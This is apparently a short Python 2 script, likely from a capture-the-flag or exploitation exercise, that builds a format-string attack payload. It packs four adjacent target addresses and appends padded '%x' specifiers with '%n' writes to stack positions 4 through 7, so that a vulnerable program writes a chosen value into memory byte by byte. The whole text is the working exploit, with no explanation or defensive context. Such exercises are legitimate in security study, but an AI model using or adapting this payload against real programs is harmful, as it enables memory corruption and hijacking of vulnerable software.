import struct

buf = ''
buf += struct.pack("I", 0x08049724)
buf += struct.pack("I", 0x08049725)
buf += struct.pack("I", 0x08049726)
buf += struct.pack("I", 0x08049727)

buf += "%164x%4$n"
buf += "%208x%5$n"
buf += "%128x%6$n"
buf += "%260x%7$n"

print buf

